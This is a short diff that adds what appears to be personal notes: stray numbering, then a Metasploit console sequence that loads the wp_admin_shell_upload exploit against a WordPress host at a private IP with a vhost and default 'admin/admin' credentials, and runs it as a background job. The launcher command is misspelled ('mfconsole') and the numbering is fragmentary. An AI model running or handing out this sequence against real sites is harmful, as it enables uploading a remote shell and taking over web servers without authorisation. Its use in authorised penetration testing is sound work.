@@ -1,0 +1,14 @@
+1.
+
+
+
+
+1.
+mfconsole -q
+use exploit/unix/webapp/wp_admin_shell_upload
+set rhosts 10.1.1.80
+set vhost myserver.domain.local
+set username admin
+set password admin
+set HTTPClientTimeout 300
+run -j
